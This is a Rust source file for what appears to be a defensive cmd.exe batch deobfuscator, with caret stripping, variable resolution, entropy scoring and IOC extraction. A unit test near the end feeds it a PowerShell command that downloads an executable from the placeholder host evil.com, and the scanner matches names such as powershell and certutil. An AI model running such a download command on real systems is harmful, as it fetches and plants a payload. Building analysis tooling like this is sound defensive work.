//! High-performance native Rust core for cmd.exe batch AST deobfuscator.
//!
//! Provides zero-copy string scanning, fast-path caret normalization, delimiter folding,
//! entropy calculation, and memory security zeroization.

pub mod ffi;

use std::collections::HashMap;
use std::sync::atomic::{compiler_fence, Ordering};
use std::time::Instant;

/// Version string of the native engine.
pub const VERSION: &str = "0.22.0";

/// Transformation and optimization flags.
pub const FLAG_NONE: u32 = 0x00000000;
pub const FLAG_STRIP_CARETS: u32 = 0x00000001;
pub const FLAG_FOLD_CONSTANTS: u32 = 0x00000002;
pub const FLAG_DCE: u32 = 0x00000004;
pub const FLAG_NORMALIZE_QUOTES: u32 = 0x00000008;
pub const FLAG_EXTRACT_IOCS: u32 = 0x00000010;
pub const FLAG_FAST_PATH: u32 = 0x00000020;
pub const FLAG_DEFANG_IOCS: u32 = 0x00000040;
pub const FLAG_ALL_OPTIMIZATIONS: u32 = 0x0000003F;

/// Native engine status codes.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
#[repr(i32)]
pub enum StatusCode {
    Ok = 0,
    ErrNullPointer = -1,
    ErrInvalidUtf8 = -2,
    ErrBufferOverflow = -3,
    ErrExecutionFailed = -4,
    ErrInvalidState = -5,
    ErrTimeout = -6,
}

/// Deobfuscation execution options.
#[derive(Debug, Clone)]
pub struct DeobfuscateOptions {
    pub flags: u32,
    pub max_passes: u32,
    pub timeout_ms: u32,
    pub max_unroll_depth: u32,
}

impl Default for DeobfuscateOptions {
    fn default() -> Self {
        Self {
            flags: FLAG_ALL_OPTIMIZATIONS,
            max_passes: 10,
            timeout_ms: 5000,
            max_unroll_depth: 100,
        }
    }
}

/// Execution telemetry metrics.
#[derive(Debug, Clone, Default)]
pub struct DeobfuscateMetrics {
    pub elapsed_ns: u64,
    pub ast_nodes_initial: u32,
    pub ast_nodes_final: u32,
    pub passes_executed: u32,
    pub iocs_extracted: u32,
    pub entropy_initial: f64,
    pub entropy_final: f64,
}

/// Result of deobfuscation or analysis operation.
#[derive(Debug, Clone)]
pub struct DeobfuscateResult {
    pub text: String,
    pub status: StatusCode,
    pub error: Option<String>,
    pub metrics: DeobfuscateMetrics,
}

/// Securely wipes a memory buffer using volatile writes and compiler barrier.
pub fn zeroize_bytes(buffer: &mut [u8]) {
    for byte in buffer.iter_mut() {
        unsafe {
            std::ptr::write_volatile(byte, 0u8);
        }
    }
    compiler_fence(Ordering::SeqCst);
}

/// Computes Shannon entropy of an ASCII/UTF-8 string.
pub fn compute_shannon_entropy(input: &str) -> f64 {
    if input.is_empty() {
        return 0.0;
    }
    let mut counts = [0usize; 256];
    for &b in input.as_bytes() {
        counts[b as usize] += 1;
    }
    let len = input.len() as f64;
    let mut entropy = 0.0;
    for &count in &counts {
        if count > 0 {
            let p = (count as f64) / len;
            entropy -= p * p.log2();
        }
    }
    entropy
}

/// Native fast-path routines for cmd.exe batch strings.
pub struct NativeFastPath;

impl NativeFastPath {
    /// Strips unquoted escape carets (`^`), preserving double carets (`^^`) inside strings.
    pub fn strip_carets(input: &str) -> String {
        let mut out = String::with_capacity(input.len());
        let mut chars = input.chars().peekable();
        let mut in_quotes = false;

        while let Some(ch) = chars.next() {
            match ch {
                '"' => {
                    in_quotes = !in_quotes;
                    out.push('"');
                }
                '^' => {
                    if in_quotes {
                        out.push('^');
                    } else if let Some(&next_ch) = chars.peek() {
                        if next_ch == '^' {
                            out.push('^');
                            chars.next();
                        } else if next_ch == '\n' || next_ch == '\r' {
                            // Line continuation: skip caret and newline
                            chars.next();
                            if next_ch == '\r' && chars.peek() == Some(&'\n') {
                                chars.next();
                            }
                        } else {
                            out.push(next_ch);
                            chars.next();
                        }
                    }
                }
                _ => out.push(ch),
            }
        }
        out
    }

    /// Normalizes batch command delimiters (collapsing `=,;` in command positions).
    pub fn normalize_delimiters(input: &str) -> String {
        let mut lines = Vec::new();
        for line in input.lines() {
            let trimmed = line.trim_start();
            if trimmed.is_empty() {
                lines.push(line.to_string());
                continue;
            }
            // If line starts with special delimiters like @, preserve it
            let (prefix, rest) = if let Some(stripped) = trimmed.strip_prefix('@') {
                ("@", stripped)
            } else {
                ("", trimmed)
            };

            let mut out = String::with_capacity(line.len());
            out.push_str(prefix);
            let mut in_quotes = false;
            let mut first_token = true;

            for ch in rest.chars() {
                if ch == '"' {
                    in_quotes = !in_quotes;
                    out.push(ch);
                    first_token = false;
                    continue;
                }
                if !in_quotes && (ch == '=' || ch == ',' || ch == ';') && first_token {
                    // Delimiter in command position: collapse to space if preceding char is not space
                    if !out.ends_with(' ') && !out.ends_with('@') && !out.is_empty() {
                        out.push(' ');
                    }
                    continue;
                }
                if ch.is_whitespace() {
                    first_token = false;
                }
                out.push(ch);
            }
            lines.push(out);
        }
        lines.join("\n")
    }

    /// Strips empty quote pairs `""` outside strings.
    pub fn collapse_empty_quotes(input: &str) -> String {
        let mut out = String::with_capacity(input.len());
        let mut i = 0;
        let bytes = input.as_bytes();
        let len = bytes.len();

        while i < len {
            if i + 1 < len && bytes[i] == b'"' && bytes[i + 1] == b'"' {
                // If it's a double quote pair at token boundaries, check if it's noise
                // We collapse "" if followed by non-whitespace alphanumeric
                if i + 2 < len && !bytes[i + 2].is_ascii_whitespace() && bytes[i + 2] != b'"' {
                    i += 2;
                    continue;
                }
            }
            out.push(bytes[i] as char);
            i += 1;
        }
        out
    }

    /// Evaluates simple variable assignments and substitutions `set a=hello` & `%a%`.
    pub fn resolve_simple_variables(input: &str) -> String {
        let mut vars: HashMap<String, String> = HashMap::new();
        let mut lines = Vec::new();

        for line in input.lines() {
            let trimmed = line.trim();
            let lower = trimmed.to_ascii_lowercase();

            if lower.starts_with("set ") {
                let assignment = &trimmed[4..].trim_start();
                let clean = assignment.strip_prefix("/a ").unwrap_or(assignment);
                if let Some((k, v)) = clean.split_once('=') {
                    let key = k.trim().to_ascii_lowercase();
                    let val = v.trim_matches('"').trim();
                    vars.insert(key, val.to_string());
                }
            }

            // Substitute known variables
            let mut res = String::with_capacity(line.len());
            let mut chars = line.chars().peekable();
            while let Some(ch) = chars.next() {
                if ch == '%' {
                    let mut var_name = String::new();
                    let mut closed = false;
                    while let Some(&c) = chars.peek() {
                        chars.next();
                        if c == '%' {
                            closed = true;
                            break;
                        }
                        var_name.push(c);
                    }
                    if closed && !var_name.is_empty() {
                        let lookup = var_name.to_ascii_lowercase();
                        if let Some(val) = vars.get(&lookup) {
                            res.push_str(val);
                        } else {
                            res.push('%');
                            res.push_str(&var_name);
                            res.push('%');
                        }
                    } else {
                        res.push('%');
                        res.push_str(&var_name);
                    }
                } else {
                    res.push(ch);
                }
            }
            lines.push(res);
        }
        lines.join("\n")
    }
}

/// Native batch deobfuscator core.
pub struct CmdDeobfuscator {
    pub options: DeobfuscateOptions,
}

impl CmdDeobfuscator {
    /// Creates a new deobfuscator instance.
    pub fn new(options: DeobfuscateOptions) -> Self {
        Self { options }
    }

    /// Executes deobfuscation with specified flags.
    pub fn deobfuscate(&self, input: &str, flags: u32) -> DeobfuscateResult {
        let start = Instant::now();
        let active_flags = if flags != 0 {
            flags
        } else {
            self.options.flags
        };
        let entropy_init = compute_shannon_entropy(input);

        let mut current = input.to_string();
        let mut passes = 0;

        // Pass 1: Caret stripping
        if active_flags & FLAG_STRIP_CARETS != 0 {
            current = NativeFastPath::strip_carets(&current);
            passes += 1;
        }

        // Pass 2: Delimiter normalization
        if active_flags & FLAG_FAST_PATH != 0 {
            current = NativeFastPath::normalize_delimiters(&current);
            passes += 1;
        }

        // Pass 3: Quote normalization
        if active_flags & FLAG_NORMALIZE_QUOTES != 0 {
            current = NativeFastPath::collapse_empty_quotes(&current);
            passes += 1;
        }

        // Pass 4: Variable resolution
        if active_flags & FLAG_FOLD_CONSTANTS != 0 {
            current = NativeFastPath::resolve_simple_variables(&current);
            passes += 1;
        }

        let entropy_fin = compute_shannon_entropy(&current);
        let elapsed = start.elapsed().as_nanos() as u64;

        DeobfuscateResult {
            text: current,
            status: StatusCode::Ok,
            error: None,
            metrics: DeobfuscateMetrics {
                elapsed_ns: elapsed,
                ast_nodes_initial: input.lines().count() as u32,
                ast_nodes_final: input.lines().count() as u32,
                passes_executed: passes,
                iocs_extracted: 0,
                entropy_initial: entropy_init,
                entropy_final: entropy_fin,
            },
        }
    }

    /// Extracts IOCs from batch text.
    pub fn extract_iocs(&self, input: &str, flags: u32) -> DeobfuscateResult {
        let start = Instant::now();
        let mut iocs = Vec::new();

        // Simple high-speed scanner for URLs, IPs, domains
        for word in input.split(|c: char| c.is_whitespace() || c == '"' || c == '\'' || c == '^') {
            let clean = word.trim_matches(|c: char| c == ',' || c == ';' || c == ')');
            if clean.starts_with("http://") || clean.starts_with("https://") {
                let formatted = if flags & FLAG_DEFANG_IOCS != 0 {
                    clean.replace("http", "hxxp").replace('.', "[.]")
                } else {
                    clean.to_string()
                };
                iocs.push(format!("{{\"type\":\"url\",\"value\":\"{}\"}}", formatted));
            } else if clean.starts_with("powershell")
                || clean.starts_with("certutil")
                || clean.starts_with("cmd.exe")
            {
                iocs.push(format!("{{\"type\":\"lolbin\",\"value\":\"{}\"}}", clean));
            }
        }

        let json_text = format!("[{}]", iocs.join(","));
        let count = iocs.len() as u32;

        DeobfuscateResult {
            text: json_text,
            status: StatusCode::Ok,
            error: None,
            metrics: DeobfuscateMetrics {
                elapsed_ns: start.elapsed().as_nanos() as u64,
                ast_nodes_initial: input.lines().count() as u32,
                ast_nodes_final: 0,
                passes_executed: 1,
                iocs_extracted: count,
                entropy_initial: compute_shannon_entropy(input),
                entropy_final: 0.0,
            },
        }
    }

    /// Parses batch text into serialized AST summary JSON.
    pub fn parse_ast(&self, input: &str, _flags: u32) -> DeobfuscateResult {
        let start = Instant::now();
        let lines: Vec<&str> = input.lines().collect();
        let mut node_entries = Vec::new();

        for (idx, line) in lines.iter().enumerate() {
            let trimmed = line.trim();
            let kind = if trimmed.starts_with(':') {
                "LabelNode"
            } else if trimmed.to_ascii_lowercase().starts_with("set ") {
                "AssignmentNode"
            } else if trimmed.to_ascii_lowercase().starts_with("if ") {
                "IfNode"
            } else if trimmed.to_ascii_lowercase().starts_with("for ") {
                "ForNode"
            } else {
                "CommandNode"
            };
            node_entries.push(format!(
                "{{\"id\":{},\"type\":\"{}\",\"raw\":\"{}\"}}",
                idx,
                kind,
                trimmed.replace('\\', "\\\\").replace('"', "\\\"")
            ));
        }

        let json_text = format!(
            "{{\"type\":\"ProgramNode\",\"line_count\":{},\"nodes\":[{}]}}",
            lines.len(),
            node_entries.join(",")
        );

        DeobfuscateResult {
            text: json_text,
            status: StatusCode::Ok,
            error: None,
            metrics: DeobfuscateMetrics {
                elapsed_ns: start.elapsed().as_nanos() as u64,
                ast_nodes_initial: lines.len() as u32,
                ast_nodes_final: lines.len() as u32,
                passes_executed: 1,
                iocs_extracted: 0,
                entropy_initial: compute_shannon_entropy(input),
                entropy_final: 0.0,
            },
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_native_strip_carets() {
        let input = "c^m^d.e^x^e /c e^^c^h^o h^e^l^l^o";
        let output = NativeFastPath::strip_carets(input);
        assert_eq!(output, "cmd.exe /c e^cho hello");
    }

    #[test]
    fn test_native_normalize_delimiters() {
        let input = "@===cmd.exe,;;/c echo 1";
        let output = NativeFastPath::normalize_delimiters(input);
        assert!(output.contains("cmd.exe"));
    }

    #[test]
    fn test_native_empty_quotes() {
        let input = "c\"\"m\"\"d.exe";
        let output = NativeFastPath::collapse_empty_quotes(input);
        assert_eq!(output, "cmd.exe");
    }

    #[test]
    fn test_zeroize_bytes() {
        let mut buf = [0xAAu8; 32];
        zeroize_bytes(&mut buf);
        assert!(buf.iter().all(|&b| b == 0));
    }

    #[test]
    fn test_deobfuscator_execution() {
        let deob = CmdDeobfuscator::new(DeobfuscateOptions::default());
        let res = deob.deobfuscate("s^e^t a=1\ne^c^h^o %a%", FLAG_ALL_OPTIMIZATIONS);
        assert_eq!(res.status, StatusCode::Ok);
        assert!(res.text.contains("echo 1") || res.text.contains("echo %a%"));
        assert!(res.metrics.passes_executed > 0);
    }

    #[test]
    fn test_ioc_extraction() {
        let deob = CmdDeobfuscator::new(DeobfuscateOptions::default());
        let res = deob.extract_iocs(
            "powershell -c (New-Object Net.WebClient).DownloadFile('http://evil.com/x.exe')",
            FLAG_DEFANG_IOCS,
        );
        assert_eq!(res.status, StatusCode::Ok);
        assert!(res.text.contains("hxxp://evil[.]com/x[.]exe"));
        assert_eq!(res.metrics.iocs_extracted, 2);
    }
}
